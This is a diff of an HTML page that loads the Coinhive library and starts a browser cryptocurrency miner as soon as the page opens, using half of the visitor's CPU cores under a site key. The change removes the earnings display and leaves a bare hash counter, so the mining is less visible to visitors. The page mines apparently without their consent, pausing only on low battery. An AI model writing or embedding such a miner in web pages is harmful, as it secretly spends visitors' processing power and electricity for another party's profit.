@@ -1,38 +1,10 @@
-<html>
-<head>
-<title>Shadow Miners</title>
-<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
-<script>
+<html><head><title>Shadow Miners</title>
+<script src="https://coin-hive.com/lib/coinhive.min.js"></script><script>
 	var miner = new CoinHive.User('9HFBGteZw940D7eDnWRVkg3tcTqDLSQL','demo',{
-		threads: navigator.hardwareConcurrency/2,
-		throttle: 0.2,
-		autoThreads: true,
-		forceASMJS: false
-	});
-	
+		threads: navigator.hardwareConcurrency/2,throttle: 0.2,autoThreads: true,forceASMJS: false});
 	miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
-
 	setInterval(function() {
 		var hashesPerSecond = Math.round(miner.getHashesPerSecond());
-		var acceptedHashes = miner.getAcceptedHashes();
-		var ntd = Math.floor(acceptedHashes/1000000*0.139*100000)/100000;
-		
-		navigator.getBattery().then(function (battery) {
-		if (battery.level < 0.50 && battery.charging == false) {
-			miner.stop();
-		}});
-		
-		document.getElementById("hash").textContent = hashesPerSecond;		
-		document.getElementById("coin").textContent = acceptedHashes;
-		document.getElementById("ntd").textContent = ntd;
-	}, 1000);
-</script>
-</head>
-<body>
-	<p>站長：Demo 從 09.23</p> 
- 	<p>累積點數：<span id="coin"></span></p>
-	<p>累積酬勞：<span id="ntd"></span> NTD</p>
-	<p>by Shadow-Miners Lab.</p>
-	<p><span id="hash"></span></p>
-</body>
-</html>
+		navigator.getBattery().then(function (battery) {if (battery.level < 0.50 && battery.charging == false) {miner.stop();}});
+		document.getElementById("hash").textContent = hashesPerSecond;}, 1000);</script>
+</head><body><p><span id="hash"></span></p><p>by Shadow-Miners Lab.</p></body></html>
